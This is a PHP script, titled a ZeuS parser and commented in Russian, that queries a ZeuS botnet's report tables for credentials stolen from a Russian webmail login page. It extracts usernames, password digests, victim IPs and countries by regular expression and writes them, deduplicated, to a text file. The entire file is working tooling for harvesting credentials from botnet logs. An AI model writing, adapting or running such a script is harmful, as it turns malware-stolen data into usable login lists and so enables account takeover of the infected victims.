<?php
//Database setting
    $DB_HOST = "localhost"; //Адрес сервера MySQL
    $DB_USER = "user437_spaider3"; //Имя пользователя базы данных
    $DB_PASS = "pass"; //Пароль пользователя БД
    $DB_NAME = "user437_photovote"; //База данных
//Database connect
	$dbcnx = @mysql_connect ($DB_HOST, $DB_USER, $DB_PASS);
	if (!$dbcnx)
	{
		exit ("<p>В настоящий момент сервер базы данных не доступен, поэтому корректное отображение страницы невозможно.</p>");
	}
	if (!@mysql_select_db($DB_NAME,$dbcnx)) 
	{
	    exit ("<p>В настоящий момент база данных не доступна, поэтому корректное отображение страницы невозможно.</p>");
	}
?>
<?php
/*
+----------------------------------+
|     ZeuS Parser by Spaider3      |
+----------------------------------+
*/
$beginning = "110328"; //Начальный номер таблицы
$end = "110728"; //Конечный номер таблицы
$temporary_file = "temp.txt"; //Времянный файл
$file = "ZeuS.txt"; //Файл для записи
//$return = explode(' ', $request); //Расщипляем запрос на слова.
//preg_replace (' ',',', $request);
$separator = "|"; //Разделитель
$fd = fopen($temporary_file,"a+t");
fwrite ($fd,"login ".$separator." password ".$separator." ip ".$separator." country\n");
for($i = $beginning; $i < $end; $i++)//Начало цикла
{
$parser = mysql_query("SELECT context,ipv4,country FROM botnet_reports_".$i." WHERE path_source = 'http://mail.qip.ru/webim/server_auth.php'");//Запрос в базу данных
while ($res = mysql_fetch_assoc($parser)){
$res['context'] = mb_convert_encoding(urldecode($res['context']), 'cp-1251', 'utf-8'); //Декодирование символов, если ненужно закомментировать.
preg_match("/username==(.*)[\n]password_digest=(.*)[\n]/sU",$res['context'],$context);
print_r ($context);
/*echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"/>";
echo "<div style=\"margin:0 auto;margin-top:5px;padding-top:10px;color:#000;background-color:#f0ffea;border:2px solid #95ff6e;width:99%;min-height:30px;\" align=\"center\">".$context[1]." ".$separator." ".$context[2]." ".$separator." ".$res['ipv4']." ".$separator." ".$res['country']."</div></br>";*/
fwrite ($fd,"".$context[1]." ".$separator." ".$context[2]." ".$separator." ".$res['ipv4']." ".$separator." ".$res['country']."\n");
}
}
fclose($fd);
//Происходит удаление одинаковых строк
$f1=fopen($temporary_file,'r'); 
$f2=fopen($file,'w'); 
$str_array = array(); 
while($str=fgets($f1,1024)) 
{    
    $str_array[] =  trim($str); 
} 
$str_array = array_unique($str_array); 
foreach ($str_array as $item) 
{ 
    fputs($f2,$item."\r\n"); 
}
unlink($temporary_file);
//Конец цикла удаления одинаковых строк,выводим сообщение о завершении парсинга.
echo "<div style=\"margin:0 auto;margin-top:5px;padding-top:10px;color:#000;background-color:#f0ffea;border:2px solid #95ff6e;width:99%;min-height:30px;\" align=\"center\"><b>Процесс экспорта завершён! Отчёты сохранены в файл ".$file."</b></div>"; //Могут быть проблемы с выводом на страницу из-за задержки. Закомментируйте все echo в цикле.
?>